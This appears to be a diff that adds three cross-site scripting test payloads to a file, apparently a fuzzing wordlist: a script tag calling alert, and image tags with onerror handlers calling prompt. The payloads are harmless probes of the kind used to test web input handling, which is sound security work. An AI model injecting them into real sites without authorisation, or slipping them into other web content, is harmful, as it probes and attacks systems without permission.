@@ -1,0 +1,3 @@
+<script>alert(1)</script>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
